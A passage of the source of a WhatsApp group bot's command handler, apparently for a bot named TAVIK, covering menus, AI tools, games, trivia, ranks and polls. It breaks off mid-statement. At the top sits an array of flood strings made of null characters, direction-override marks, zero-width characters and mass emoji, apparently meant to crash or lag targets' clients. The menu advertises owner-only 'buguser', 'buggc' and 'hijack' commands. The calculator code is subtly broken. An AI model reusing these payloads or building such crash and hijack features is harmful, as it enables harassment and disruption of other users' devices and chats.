'use strict'

const api       = require('./api')
const state     = require('./state')
const utils     = require('./utils')
const cdn       = require('./cdn')
const reactions = require('./reactions')
const { BOT_NAME, BOT_VERSION, OWNER_NAME, OWNER_NUMBER, OWNER_NUMBERS, PREFIX } = require('./config')

const FLOOD_PAYLOADS = [
    () => '\u0000'.repeat(3000) + '꧔ꦿ'.repeat(1000),
    () => '᷂᷿᷄᷾'.repeat(2000) + '\u202E'.repeat(1000),
    () => '\u200B\u200C\u200D\uFEFF'.repeat(3000),
    () => '𒐫'.repeat(2000) + '\u0000'.repeat(500),
    () => '🔥💥⚡🌀'.repeat(2000),
    () => '\u202E' + 'TAVIK'.repeat(1000) + '\u202C'.repeat(1000),
]

const GIF_ACTIONS = {
    hug:'hug', pat:'pat', slap:'slap', kiss:'kiss', cry:'cry',
    dance:'dance', wave:'wave', wink:'wink', bite:'bite', blush:'blush',
    cuddle:'cuddle', poke:'poke', yeet:'yeet', bonk:'bonk', lick:'lick',
    highfive:'highfive', smile:'smile', happy:'happy', handhold:'handhold',
    nom:'nom', bully:'bully', kill:'kill',
}

const pick   = arr => arr[Math.floor(Math.random() * arr.length)]
const sleep  = ms  => new Promise(r => setTimeout(r, ms))
const digits = str => str?.replace(/[^0-9]/g, '') || ''

function extractTarget(arg = '', quotedParticipant = '') {
    if (!arg && quotedParticipant)
        return quotedParticipant.replace(/@s\.whatsapp\.net/g, '').replace(/[^0-9]/g, '')
    if (arg?.startsWith('@')) return arg.replace('@', '').replace(/[^0-9]/g, '')
    return arg?.replace(/[^0-9]/g, '') || null
}

// Get REAL phone number from participant — filters out @lid garbage
function getParticipantNumbers(participants) {
    return participants
        .map(p => p.realNumber || api.participantToNumber(p))
        .filter(n => n && n.length >= 7)
}

function buildMenu(chatId) {
    const chatbotOn = state.chatbot[chatId] ? 'ON 🟢' : 'OFF 🔴'
    const modeStr   = state.selfMode ? 'Self 🔒' : 'Public 🔓'
    return (
`╭═══ ${BOT_NAME} ═══⊷
┃❃╭──────────────────
┃❃│ Prefix  : ${PREFIX}
┃❃│ Owner   : ${OWNER_NAME}
┃❃│ Version : ${BOT_VERSION}
┃❃│ Mode    : ${modeStr}
┃❃│ Chatbot : ${chatbotOn}
┃❃│ Uptime  : ${utils.getUptime()}
┃❃╰───────────────────
╰══════════════════════⊷

 ╭─❏ 🌐 ɢᴇɴᴇʀᴀʟ ❏
 │ alive  ping  info
 │ credits  owner
 ╰─────────────────

 ╭─❏ 🤖 ᴀɪ & ᴛᴏᴏʟs ❏
 │ ai <question>
 │ codeai <request>
 │ createwebsite <desc>
 │ translate <lang> <text>
 │ wiki <topic>
 │ define <word>
 │ weather <city>
 │ calc <math>
 │ qrcode <text>
 │ genpass [length]
 │ shorturl <url>
 │ screenshot <url>
 │ carbon <code>
 │ ipinfo <ip>
 │ reverse <text>
 │ encode / decode <text>
 │ time
 │ pint <search>
 │ cat   dog
 ╰─────────────────

 ╭─❏ 🎬 ᴍᴇᴅɪᴀ ❏
 │ tiktok <url>
 │ meme
 │ lyrics <song>
 ╰─────────────────

 ╭─❏ 🎮 ɢᴀᴍᴇs & ꜰᴜɴ ❏
 │ dice   coin   8ball
 │ truth  dare
 │ joke   dadjoke
 │ funfact  advice
 │ quote  roast
 │ compliment [@user]
 │ ship @user1 @user2
 │ fakeid
 │ trivia  .answer <n>
 │ stoptrivia
 ╰─────────────────

 ╭─❏ 💞 ʀᴇᴀᴄᴛɪᴏɴs ❏
 │ hug  pat  slap  kiss
 │ cry  dance  wave  wink
 │ bite  blush  cuddle
 │ poke  yeet  bonk  lick
 │ highfive  smile  happy
 │ handhold  nom  bully  kill
 │ _Usage: ${PREFIX}hug @number_
 ╰─────────────────

 ╭─❏ 👥 ɢʀᴏᴜᴘ ❏
 │ tagall [msg]  hidetag
 │ tagadmins [msg]
 │ kick  add  warn
 │ warnings  clearwarnings
 │ promote  demote
 │ mute  unmute
 │ gcinfo  listadmins
 │ grouplink  resetlink
 │ setgcname  kickall
 │ poll Q|Opt1|Opt2|...
 │ vote <n>  pollresult
 │ endpoll
 │ rank [@user]
 │ leaderboard
 │ del
 ╰─────────────────

 ╭─❏ ⚙️ sᴇᴛᴛɪɴɢs ❏
 │ chatbot on/off
 │ autoreply on/off
 │ antilink on/off
 │ antispam on/off
 │ antibadword on/off
 │ antidelete on/off
 │ antighostping on/off
 │ autoread on/off
 │ autoreact on/off
 │ autotyping on/off
 │ welcome on/off/<msg>
 │ goodbye off/<msg>
 │ announce on/off
 ╰─────────────────

 ╭─❏ 👑 ᴏᴡɴᴇʀ ᴏɴʟʏ ❏
 │ self  public
 │ addsudo  delsudo  sudolist
 │ broadcast <msg>
 │ buguser  buggc  stopflood
 │ hijack  banuser
 │ botstatus
 ╰─────────────────

_💡 Say *tavik* anytime to wake me!_`)
}

async function handleCommand(chatId, sender, text, qid, isOwner, isSudo, isGroup, msg, isGroupAdmin = false) {
    const isPrivileged = isOwner || isSudo || isGroupAdmin
    const args  = text.trim().split(/\s+/)
    const cmd   = args[0].toLowerCase()
    const query = args.slice(1).join(' ')
    const quotedParticipant = msg?.message?.extendedTextMessage?.contextInfo?.participant || ''

    // ── MENU ─────────────────────────────────────────────────
    if (cmd === `${PREFIX}menu` || cmd === `${PREFIX}help`) {
        await api.sendTyping(chatId, 1)
        return api.sendText(chatId, buildMenu(chatId), qid)
    }

    // ── GENERAL ──────────────────────────────────────────────
    if (cmd === `${PREFIX}alive`) {
        return api.sendText(chatId,
            `╭═══ ${BOT_NAME} ═══⊷\n┃❃│ ✅ BOT IS ALIVE!\n┃❃│ ⏳ Uptime  : ${utils.getUptime()}\n┃❃│ 👑 Owner   : ${OWNER_NAME}\n┃❃│ 🔐 Mode    : ${state.selfMode ? 'Self 🔒' : 'Public 🔓'}\n╰══════════════════════⊷`, qid)
    }
    if (cmd === `${PREFIX}ping`) {
        const t = Date.now()
        return api.sendText(chatId, `🏓 *Pong!*\n⚡ Speed: ${Date.now() - t}ms`, qid)
    }
    if (cmd === `${PREFIX}info`) {
        return api.sendText(chatId,
            `╭─❏ 🤖 ʙᴏᴛ ɪɴꜰᴏ ❏\n │ Name    : ${BOT_NAME}\n │ Version : ${BOT_VERSION}\n │ Owner   : ${OWNER_NAME}\n │ Mode    : ${state.selfMode ? 'Self 🔒' : 'Public 🔓'}\n │ Uptime  : ${utils.getUptime()}\n │ Host    : Railway\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}credits`) {
        return api.sendText(chatId,
            `╭─❏ 🏆 ᴄʀᴇᴅɪᴛs ❏\n │ Developer : GODSWILL\n │ Bot Name  : ${BOT_NAME}\n │ Version   : ${BOT_VERSION}\n │ Host      : Railway\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}owner`) {
        return api.sendText(chatId,
            `╭─❏ 👑 ᴏᴡɴᴇʀ ❏\n │ Name : ${OWNER_NAME}\n │ 📱 wa.me/${OWNER_NUMBER}\n ╰─────────────────`, qid)
    }

    // ── AI & TOOLS ───────────────────────────────────────────
    if (cmd === `${PREFIX}ai`) {
        if (!query) return api.sendText(chatId, `❌ Usage: *${PREFIX}ai <question>*`, qid)
        await api.sendTyping(chatId, 3)
        const reply = await utils.askAI(query)
        return api.sendText(chatId, `╭─❏ 🤖 ᴀɪ ʀᴇᴘʟʏ ❏\n │\n${reply}\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}codeai` || cmd === `${PREFIX}code`) {
        if (!query) return api.sendText(chatId, `❌ Usage: *${PREFIX}codeai <request>*`, qid)
        await api.sendTyping(chatId, 4)
        const reply = await utils.askCodeAI(query)
        return api.sendText(chatId, `╭─❏ 💻 ᴄᴏᴅᴇ ʀᴇsᴜʟᴛ ❏\n │\n${reply}\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}createwebsite` || cmd === `${PREFIX}website`) {
        if (!query) return api.sendText(chatId, `❌ Usage: *${PREFIX}createwebsite <description>*`, qid)
        await api.sendTyping(chatId, 5)
        await api.sendText(chatId, `⚡ Building your website... please wait!`, qid)
        const html = await utils.createWebsite(query)
        if (!html) return api.sendText(chatId, `❌ Generation failed. Try a clearer description!`, qid)
        try {
            const buf = Buffer.from(html, 'utf-8')
            const url = await cdn.upload(buf, 'website.html', 'text/html')
            if (url) return api.sendText(chatId, `✅ *Website Ready!*\n📄 Topic: _${query}_\n🔗 Download:\n${url}\n\n_Open in any browser!_`, qid)
        } catch {}
        return api.sendText(chatId, `✅ *Website Generated!*\n\n${html.slice(0, 3500)}`, qid)
    }
    if (cmd === `${PREFIX}translate` || cmd === `${PREFIX}tr`) {
        if (!query) return api.sendText(chatId, `❌ Usage: .translate <lang> <text>\nExample: .translate French Hello`, qid)
        await api.sendTyping(chatId, 2)
        const parts = query.split(' ')
        const langs = ['english','french','spanish','arabic','hausa','yoruba','igbo','portuguese','german','chinese','japanese','korean','hindi','russian','italian','pidgin','afrikaans']
        let tLang, tText
        if (langs.includes(parts[0].toLowerCase()) || (parts[0].length <= 3 && parts.length > 1)) {
            tLang = parts[0]; tText = parts.slice(1).join(' ')
        } else { tLang = 'English'; tText = query }
        if (!tText) return api.sendText(chatId, `❌ No text to translate!`, qid)
        const result = await utils.translateText(tText, tLang)
        return api.sendText(chatId, `╭─❏ 🌐 ᴛʀᴀɴsʟᴀᴛᴇ ❏\n │ 🗣️ To: *${tLang}*\n │\n │ ${result}\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}wiki`) {
        if (!query) return api.sendText(chatId, `❌ Usage: *${PREFIX}wiki <topic>*`, qid)
        await api.sendTyping(chatId, 2)
        const result = await utils.getWiki(query)
        if (!result) return api.sendText(chatId, `❌ Nothing found for "${query}"`, qid)
        return api.sendText(chatId, `╭─❏ 📖 ᴡɪᴋɪ ❏\n │ *${query}*\n │\n │ ${result.slice(0, 700).replace(/\n/g, '\n │ ')}...\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}define` || cmd === `${PREFIX}dictionary`) {
        if (!query) return api.sendText(chatId, `❌ Usage: *${PREFIX}define <word>*`, qid)
        await api.sendTyping(chatId, 2)
        const r = await utils.getDictionary(query)
        if (!r) return api.sendText(chatId, `❌ No definition found for "${query}"`, qid)
        return api.sendText(chatId,
            `╭─❏ 📚 ᴅᴇꜰɪɴɪᴛɪᴏɴ ❏\n │ *${r.word}* ${r.phonetic}\n │ _(${r.partOfSpeech})_\n │ ${r.definition}\n │ ${r.example ? `💬 _"${r.example}"_` : ''}\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}weather`) {
        if (!query) return api.sendText(chatId, `❌ Usage: *${PREFIX}weather <city>*`, qid)
        await api.sendTyping(chatId, 2)
        const r = await utils.getWeather(query)
        if (!r) return api.sendText(chatId, `❌ City not found!`, qid)
        return api.sendText(chatId, `╭─❏ 🌤️ ᴡᴇᴀᴛʜᴇʀ ❏\n │ *${query}*\n │ ${r}\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}calculate` || cmd === `${PREFIX}calc`) {
        if (!query) return api.sendText(chatId, `❌ Usage: *${PREFIX}calc <expression>*`, qid)
        try {
            const safe = query.replace(/[^0-9+\-*/.()%\s]/g, '')
            if (!safe) return api.sendText(chatId, `❌ Invalid expression!`, qid)
            // eslint-disable-next-line no-new-func
            const result = Function('"use strict"; return (' + safe + ')()')()
            if (!isFinite(result)) return api.sendText(chatId, `❌ Math error!`, qid)
            return api.sendText(chatId, `╭─❏ 🧮 ᴄᴀʟᴄᴜʟᴀᴛᴏʀ ❏\n │ 📝 ${query}\n │ ✅ = *${result}*\n ╰─────────────────`, qid)
        } catch { return api.sendText(chatId, `❌ Invalid expression!`, qid) }
    }
    if (cmd === `${PREFIX}time`) {
        const n = new Date()
        return api.sendText(chatId,
            `╭─❏ 🕐 ᴛɪᴍᴇ ❏\n │ 📅 ${n.toDateString()}\n │ ⏰ ${n.toTimeString().split(' ')[0]}\n │ 🌍 ${n.toUTCString()}\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}shorturl` || cmd === `${PREFIX}shorten`) {
        if (!query) return api.sendText(chatId, `❌ Usage: .shorturl <url>`, qid)
        await api.sendTyping(chatId, 1)
        const surl = await utils.shortenUrl(query)
        if (!surl) return api.sendText(chatId, `❌ Failed to shorten URL!`, qid)
        return api.sendText(chatId, `╭─❏ 🔗 sʜᴏʀᴛ ᴜʀʟ ❏\n │ 🔗 Original: ${query.slice(0,60)}\n │ ✅ Short: ${surl}\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}screenshot` || cmd === `${PREFIX}ss`) {
        if (!query) return api.sendText(chatId, `❌ Usage: .screenshot <url>`, qid)
        await api.sendTyping(chatId, 3)
        await api.sendText(chatId, `📸 Taking screenshot...`, qid)
        return api.sendImage(chatId, utils.screenshotUrl(query), `📸 *Screenshot:* ${query}`, qid)
    }
    if (cmd === `${PREFIX}carbon`) {
        if (!query) return api.sendText(chatId, `❌ Usage: .carbon <code>`, qid)
        const imgUrl = `https://carbonara.solopov.dev/api/cook?code=${encodeURIComponent(query)}&theme=dracula&language=auto`
        return api.sendImage(chatId, imgUrl, `💻 *Code Image*`, qid)
    }
    if (cmd === `${PREFIX}ipinfo` || cmd === `${PREFIX}ip`) {
        if (!args[1]) return api.sendText(chatId, `❌ Usage: .ipinfo <ip>`, qid)
        await api.sendTyping(chatId, 2)
        try {
            const axios = require('axios')
            const r = await axios.get(`https://ipapi.co/${args[1]}/json/`, { timeout: 10_000 })
            const d = r.data
            if (d.error) return api.sendText(chatId, `❌ Invalid IP!`, qid)
            return api.sendText(chatId,
                `╭─❏ 🌐 ɪᴘ ɪɴꜰᴏ ❏\n │ 🖥️ IP      : ${d.ip}\n │ 🌍 Country : ${d.country_name}\n │ 🏙️ City    : ${d.city}\n │ 📡 ISP     : ${d.org}\n │ ⏰ Timezone: ${d.timezone}\n ╰─────────────────`, qid)
        } catch { return api.sendText(chatId, `❌ Could not fetch IP info!`, qid) }
    }
    if (cmd === `${PREFIX}reverse`) {
        if (!query) return api.sendText(chatId, `❌ Usage: .reverse <text>`, qid)
        return api.sendText(chatId, `🔄 ${query.split('').reverse().join('')}`, qid)
    }
    if (cmd === `${PREFIX}encode`) {
        if (!query) return api.sendText(chatId, `❌ Usage: .encode <text>`, qid)
        return api.sendText(chatId, `🔐 *Base64:*\n${Buffer.from(query).toString('base64')}`, qid)
    }
    if (cmd === `${PREFIX}decode`) {
        if (!query) return api.sendText(chatId, `❌ Usage: .decode <base64>`, qid)
        try { return api.sendText(chatId, `🔓 *Decoded:*\n${Buffer.from(query, 'base64').toString('utf8')}`, qid) }
        catch { return api.sendText(chatId, `❌ Invalid base64!`, qid) }
    }
    if (cmd === `${PREFIX}pint`) {
        if (!query) return api.sendText(chatId, `❌ Usage: *${PREFIX}pint <search>*`, qid)
        await api.sendTyping(chatId, 3)
        await api.sendText(chatId, `🔍 Searching images for *${query}*...`, qid)
        const urls = await utils.searchImages(query, 5)
        if (!urls.length) return api.sendText(chatId, `❌ No images found for "${query}"`, qid)
        let sent = 0
        for (const url of urls) {
            try { await api.sendImage(chatId, url, sent === 0 ? `🖼️ *${query}*` : '', qid); sent++; await sleep(500) } catch {}
        }
        if (!sent) return api.sendText(chatId, `❌ Could not load images.`, qid)
        return
    }
    if (cmd === `${PREFIX}qrcode` || cmd === `${PREFIX}qr`) {
        if (!query) return api.sendText(chatId, `❌ Usage: *${PREFIX}qrcode <text>*`, qid)
        return api.sendImage(chatId, utils.getQRCode(query), `📱 *QR Code*\n📝 ${query}`, qid)
    }
    if (cmd === `${PREFIX}genpass`) {
        const len  = Math.min(parseInt(args[1]) || 16, 64)
        const pass = utils.generatePassword(len)
        return api.sendText(chatId, `╭─❏ 🔐 ᴘᴀssᴡᴏʀᴅ ❏\n │ \`${pass}\`\n │ 📏 ${len} chars\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}cat`) {
        const url = await utils.getCatImage()
        if (!url) return api.sendText(chatId, `❌ No cat found!`, qid)
        return api.sendImage(chatId, url, `🐱 *Meow!*`, qid)
    }
    if (cmd === `${PREFIX}dog`) {
        const url = await utils.getDogImage()
        if (!url) return api.sendText(chatId, `❌ No dog found!`, qid)
        return api.sendImage(chatId, url, `🐶 *Woof!*`, qid)
    }

    // ── MEDIA ─────────────────────────────────────────────────
    if (cmd === `${PREFIX}tiktok`) {
        if (!query) return api.sendText(chatId, `❌ Usage: *${PREFIX}tiktok <url>*`, qid)
        await api.sendTyping(chatId, 3)
        await api.sendText(chatId, `⬇️ Downloading TikTok...`, qid)
        const url = await utils.downloadTiktok(query)
        if (!url) return api.sendText(chatId, `❌ Download failed! Check URL.`, qid)
        return api.sendVideo(chatId, url, `🎵 *TikTok Video*`, qid)
    }
    if (cmd === `${PREFIX}meme`) {
        await api.sendTyping(chatId, 2)
        const url = await utils.getMeme()
        if (!url) return api.sendText(chatId, `❌ No meme found!`, qid)
        return api.sendImage(chatId, url, `😂 *Random Meme*`, qid)
    }
    if (cmd === `${PREFIX}lyrics`) {
        if (!query) return api.sendText(chatId, `❌ Usage: .lyrics <song name>`, qid)
        await api.sendTyping(chatId, 3)
        await api.sendText(chatId, `🎵 Searching for *${query}*...`, qid)
        const lyr = await utils.getLyrics(query)
        if (!lyr) return api.sendText(chatId, `❌ Not found for "${query}"`, qid)
        return api.sendText(chatId,
            `╭─❏ 🎵 ʟʏʀɪᴄs ❏\n │ 🎤 *${lyr.title}*\n │ 👤 ${lyr.artist || 'Unknown'}\n │\n${lyr.lyrics.slice(0,2800)}${lyr.lyrics.length>2800?'\n...(truncated)':''}\n ╰─────────────────`, qid)
    }

    // ── GAMES & FUN ───────────────────────────────────────────
    if (cmd === `${PREFIX}dice`) {
        return api.sendText(chatId, `🎲 *Rolled:* ${Math.floor(Math.random() * 6) + 1}`, qid)
    }
    if (cmd === `${PREFIX}coin`) {
        return api.sendText(chatId, `🪙 *${Math.random() > 0.5 ? 'Heads' : 'Tails'}!*`, qid)
    }
    if (cmd === `${PREFIX}8ball`) {
        if (!query) return api.sendText(chatId, `❌ Usage: *${PREFIX}8ball <question>*`, qid)
        const answers = ['✅ Yes!','❌ No!','🤔 Maybe...','💯 Definitely!','🚫 Absolutely not!','⚡ Ask again later','🎯 Without a doubt!','💭 Cannot predict','🔮 Signs point to yes','❓ Very doubtful']
        return api.sendText(chatId, `╭─❏ 🎱 8ʙᴀʟʟ ❏\n │ ❓ ${query}\n │ 🔮 ${pick(answers)}\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}truth`) {
        const truths = ['What is your biggest fear?','What is the most embarrassing thing you have done?','Have you ever lied to a friend?','What is your biggest secret?','Who do you have a crush on?','What is your worst habit?','Have you ever cheated in a game?','What is one thing you would change about yourself?','Have you ever stolen anything?','What is the most childish thing you still do?']
        return api.sendText(chatId, `╭─❏ 💬 ᴛʀᴜᴛʜ ❏\n │ ${pick(truths)}\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}dare`) {
        const dares = ['Send a voice note singing your favourite song','Change your profile picture for 1 hour','Text your crush right now','Do 20 push-ups','Post a funny selfie in the group','Call someone and sing happy birthday','Speak in an accent for the next 10 minutes','Say something nice to everyone in the group','Do your best dance move and describe it','Tell us your phone password (just kidding! Say something embarrassing instead)']
        return api.sendText(chatId, `╭─❏ 🎭 ᴅᴀʀᴇ ❏\n │ ${pick(dares)}\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}joke`) {
        await api.sendTyping(chatId, 1)
        const j = await utils.getJoke()
        return api.sendText(chatId, `╭─❏ 😂 ᴊᴏᴋᴇ ❏\n │ ${j}\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}dadjoke`) {
        await api.sendTyping(chatId, 1)
        const j = await utils.getDadJoke()
        if (!j) return api.sendText(chatId, `❌ No dad joke today!`, qid)
        return api.sendText(chatId, `╭─❏ 👨 ᴅᴀᴅ ᴊᴏᴋᴇ ❏\n │ ${j}\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}funfact`) {
        await api.sendTyping(chatId, 1)
        const f = await utils.getFunFact()
        return api.sendText(chatId, `╭─❏ 🤯 ꜰᴜɴ ꜰᴀᴄᴛ ❏\n │ ${f}\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}advice`) {
        await api.sendTyping(chatId, 1)
        const a = await utils.getAdvice()
        return api.sendText(chatId, `╭─❏ 💡 ᴀᴅᴠɪᴄᴇ ❏\n │ ${a}\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}quote`) {
        await api.sendTyping(chatId, 1)
        const q2 = await utils.getQuote()
        return api.sendText(chatId, `╭─❏ 💬 ǫᴜᴏᴛᴇ ❏\n │ ${q2}\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}roast`) {
        const target = extractTarget(args[1], quotedParticipant)
        const roasts = [
            "I'd roast you, but my mama said not to burn trash.",
            "You're the reason the gene pool needs a lifeguard.",
            "I'd explain it to you but I left my crayons at home.",
            "Your birth certificate is an apology letter.",
            "You're not stupid. You just have bad luck thinking.",
            "I would insult your intelligence but there is clearly nothing to insult.",
            "Keep rolling your eyes, maybe you'll find a brain back there.",
        ]
        const roast = pick(roasts)
        if (target) return api.sendText(chatId, `🔥 @${target}: ${roast}`, qid)
        return api.sendText(chatId, `╭─❏ 🔥 ʀᴏᴀsᴛ ❏\n │ ${roast}\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}compliment`) {
        const target = extractTarget(args[1], quotedParticipant)
        const compliments = [
            'You are amazing and incredibly talented! 🌟',
            'Your smile lights up every room! ✨',
            'You make the world better just by being in it! 🌍',
            'You are stronger than you know! 💪',
            'Your kindness is truly inspiring! 💖',
            'You have a brilliant mind and a beautiful heart! 🧠❤️',
            'Everything you do, you do with style! 💅',
            'You deserve every good thing coming your way! 🎁',
            'Your energy is absolutely contagious! ⚡',
        ]
        const msg2 = pick(compliments)
        if (target) return api.sendText(chatId, `💝 @${target}: ${msg2}`, qid)
        return api.sendText(chatId, `💝 ${msg2}`, qid)
    }
    if (cmd === `${PREFIX}ship`) {
        const p1 = extractTarget(args[1], '') || sender
        const p2 = extractTarget(args[2], quotedParticipant) || 'someone'
        const pct = Math.floor(Math.random() * 101)
        const hearts = pct >= 70 ? '❤️❤️❤️' : pct >= 40 ? '💛💛' : '💔'
        const label  = pct >= 80 ? 'Perfect match! 💑' : pct >= 60 ? 'Good vibes! 💕' : pct >= 40 ? 'Maybe...? 😅' : 'Not meant to be 😬'
        const bar    = '█'.repeat(Math.floor(pct/10)) + '░'.repeat(10 - Math.floor(pct/10))
        return api.sendText(chatId,
            `╭─❏ 💘 sʜɪᴘ ❏\n │ @${p1} + @${p2}\n │\n │ ${hearts} *${pct}%* ${hearts}\n │ [${bar}]\n │ ${label}\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}fakeid` || cmd === `${PREFIX}fakeprofile`) {
        await api.sendTyping(chatId, 2)
        const fake = await utils.askAI('Generate a fun fake person profile with: Name, Age, Country, City, Job, Hobby, Fun fact. Format with emojis. Make it creative.')
        return api.sendText(chatId, `╭─❏ 🪪 ꜰᴀᴋᴇ ᴘʀᴏꜰɪʟᴇ ❏\n │\n${fake}\n ╰─────────────────`, qid)
    }

    // ── TRIVIA ────────────────────────────────────────────────
    if (cmd === `${PREFIX}trivia`) {
        if (state.trivia[chatId]?.active) {
            const t = state.trivia[chatId]
            return api.sendText(chatId,
                `⚠️ Trivia already active!\n\n❓ *${t.question}*\n\n${t.options.map((o,i) => `${i+1}. ${o}`).join('\n')}\n\n_Reply .answer <number>_`, qid)
        }
        await api.sendTyping(chatId, 2)
        const tv = await utils.getTriviaQuestion()
        if (!tv) return api.sendText(chatId, `❌ Could not fetch trivia!`, qid)
        state.trivia[chatId] = { ...tv, active: true }
        return api.sendText(chatId,
            `╭─❏ 🧠 ᴛʀɪᴠɪᴀ ❏\n │\n │ ❓ *${tv.question}*\n │\n` +
            tv.options.map((o, i) => ` │ ${i+1}. ${o}`).join('\n') +
            `\n │\n │ _Reply .answer <number>_\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}answer` && isGroup) {
        const tv = state.trivia[chatId]
        if (!tv?.active) return api.sendText(chatId, `❌ No active trivia! Use *.trivia*`, qid)
        const n = parseInt(args[1]) - 1
        if (isNaN(n) || n < 0 || n >= tv.options.length)
            return api.sendText(chatId, `❌ Pick 1–${tv.options.length}`, qid)
        const correct = tv.options[n] === tv.answer
        state.trivia[chatId] = { active: false }
        if (correct) {
            const xpRes = utils.addXP(state, sender, sender, 15)
            return api.sendText(chatId,
                `✅ *Correct!* 🎉 @${sender}\n🏆 Answer: *${tv.answer}*\n⚡ +15 XP!${xpRes.leveled ? `\n🎊 *LEVEL UP!* You are now Level ${xpRes.level}!` : ''}`, qid)
        }
        return api.sendText(chatId, `❌ *Wrong!* @${sender}\n💡 Correct: *${tv.answer}*`, qid)
    }
    if (cmd === `${PREFIX}stoptrivia` && isPrivileged) {
        if (!state.trivia[chatId]?.active) return api.sendText(chatId, `❌ No active trivia!`, qid)
        const ans = state.trivia[chatId].answer
        state.trivia[chatId] = { active: false }
        return api.sendText(chatId, `🛑 Trivia stopped!\n💡 Answer was: *${ans}*`, qid)
    }

    // ── XP / RANK / LEADERBOARD ───────────────────────────────
    if (cmd === `${PREFIX}rank` || cmd === `${PREFIX}level` || cmd === `${PREFIX}xp`) {
        const target = extractTarget(args[1], quotedParticipant) || sender
        const d = state.xpData?.[target]
        if (!d) return api.sendText(chatId, `❌ @${target} has no XP yet!`, qid)
        const all  = Object.entries(state.xpData || {}).sort((a,b) => (b[1].level*1000+b[1].xp)-(a[1].level*1000+a[1].xp))
        const rank = all.findIndex(e => e[0] === target) + 1
        return api.sendText(chatId,
            `╭─❏ 🏅 ʀᴀɴᴋ ❏\n │ 👤 @${target}\n │ 🎯 Level : *${d.level}*\n │ ⚡ XP    : *${d.xp}/${d.level*100}*\n │ 🏆 Rank  : *#${rank}*\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}leaderboard` || cmd === `${PREFIX}lb` || cmd === `${PREFIX}top`) {
        const lb = utils.getLeaderboard(state, 10)
        if (!lb) return api.sendText(chatId, `❌ No XP data yet! Chat to earn XP.`, qid)
        return api.sendText(chatId, `╭─❏ 🏆 ʟᴇᴀᴅᴇʀʙᴏᴀʀᴅ ❏\n │\n${lb}\n ╰─────────────────`, qid)
    }

    // ── POLLS ─────────────────────────────────────────────────
    if (cmd === `${PREFIX}poll` && isGroup && isPrivileged) {
        if (!query || !query.includes('|'))
            return api.sendText(chatId, `❌ Usage: .poll Question | Opt1 | Opt2 | Opt3\nExample: .poll Fav color? | Red | Blue | Green`, qid)
        const parts = query.split('|').map(p => p.trim()).filter(Boolean)
        const question = parts[0]
        const options  = parts.slice(1)
        if (options.length < 2) return api.sendText(chatId, `❌ Need at least 2 options!`, qid)
        if (options.length > 8) return api.sendText(chatId, `❌ Max 8 options!`, qid)
        const emojis = ['1️⃣','2️⃣','3️⃣','4️⃣','5️⃣','6️⃣','7️⃣','8️⃣']
        state.polls[chatId] = { question, options, votes: {}, voters: {} }
        return api.sendText(chatId,
            `╭─❏ 📊 ᴘᴏʟʟ ❏\n │ ❓ *${question}*\n │\n` +
            options.map((o, i) => ` │ ${emojis[i]} ${o}`).join('\n') +
            `\n │\n │ _Vote: .vote <number>_\n │ _Results: .pollresult_\n │ _End: .endpoll_\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}vote` && isGroup) {
        const poll = state.polls[chatId]
        if (!poll) return api.sendText(chatId, `❌ No active poll! Create one with *.poll*`, qid)
        const n = parseInt(args[1]) - 1
        if (isNaN(n) || n < 0 || n >= poll.options.length)
            return api.sendText(chatId, `❌ Pick 1–${poll.options.length}`, qid)
        if (poll.voters[sender]) return api.sendText(chatId, `⚠️ You already voted for: *${poll.options[poll.voters[sender]]}*`, qid)
        poll.voters[sender] = n
        poll.votes[n] = (poll.votes[n] || 0) + 1
        return api.sendText(chatId, `✅ @${sender} voted for *${poll.options[n]}*!`, qid)
    }
    if (cmd === `${PREFIX}pollresult` || cmd === `${PREFIX}pollresults`) {
        const poll = state.polls[chatId]
        if (!poll) return api.sendText(chatId, `❌ No active poll!`, qid)
        const total  = Object.values(poll.votes).reduce((a,b)=>a+b, 0)
        const emojis = ['1️⃣','2️⃣','3️⃣','4️⃣','5️⃣','6️⃣','7️⃣','8️⃣']
        const results = poll.options.map((o,i) => {
            const v   = poll.votes[i] || 0
            const pct = total ? Math.round(v/total*100) : 0
            const bar = '█'.repeat(Math.floor(pct/10)) + '░'.repeat(10-Math.floor(pct/10))
            return ` │ ${emojis[i]} ${o}\n │   [${bar}] ${pct}% (${v})`
        }).join('\n')
        return api.sendText(chatId,
            `╭─❏ 📊 ᴘᴏʟʟ ʀᴇsᴜʟᴛs ❏\n │ ❓ *${poll.question}*\n │ 👥 Total: ${total}\n │\n${results}\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}endpoll` && isGroup && isPrivileged) {
        const poll = state.polls[chatId]
        if (!poll) return api.sendText(chatId, `❌ No active poll!`, qid)
        const total  = Object.values(poll.votes).reduce((a,b)=>a+b, 0)
        const winIdx = poll.options.reduce((best,_,i) => (poll.votes[i]||0) > (poll.votes[best]||0) ? i : best, 0)
        const emojis = ['1️⃣','2️⃣','3️⃣','4️⃣','5️⃣','6️⃣','7️⃣','8️⃣']
        const results = poll.options.map((o,i) => {
            const v = poll.votes[i] || 0
            return ` │ ${emojis[i]} ${o} — ${v} (${total ? Math.round(v/total*100) : 0}%)`
        }).join('\n')
        state.polls[chatId] = null
        return api.sendText(chatId,
